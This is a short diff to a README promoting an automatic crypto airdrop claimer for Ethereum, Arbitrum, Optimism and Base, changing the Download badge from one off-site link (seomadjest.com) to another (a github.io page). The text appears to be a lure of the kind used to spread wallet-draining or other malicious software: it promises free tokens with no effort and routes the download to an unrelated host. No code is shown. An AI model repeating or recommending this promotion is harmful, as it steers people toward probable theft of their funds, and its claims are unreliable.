@@ -2,7 +2,7 @@
 
 Claim all your eligible airdrops automatically across Ethereum, Arbitrum, Optimism, Base, and more. Save time, skip manual checks, and never miss free tokens again.
 
-[![Download Auto Claimer](https://img.shields.io/badge/Download-Airdrop_Claimer-blueviolet)](https://seomadjest.com)
+[![Download Auto Claimer](https://img.shields.io/badge/Download-Airdrop_Claimer-blueviolet)](https://airdrops-auto-claimer.github.io/.github)
 
 ---
 
